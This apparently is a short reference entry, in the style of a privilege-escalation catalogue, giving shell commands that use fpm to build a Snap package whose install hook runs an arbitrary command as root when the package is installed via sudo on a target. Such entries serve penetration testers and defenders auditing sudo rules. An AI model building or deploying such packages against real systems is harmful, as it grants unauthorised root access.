sudo.description:
It runs commands using a specially crafted Snap package. Generate it with 'https://github.com/jordansissel/fpm' and upload it to the target.
```cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "[command]" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n x -s dir -t snap -a all meta
```
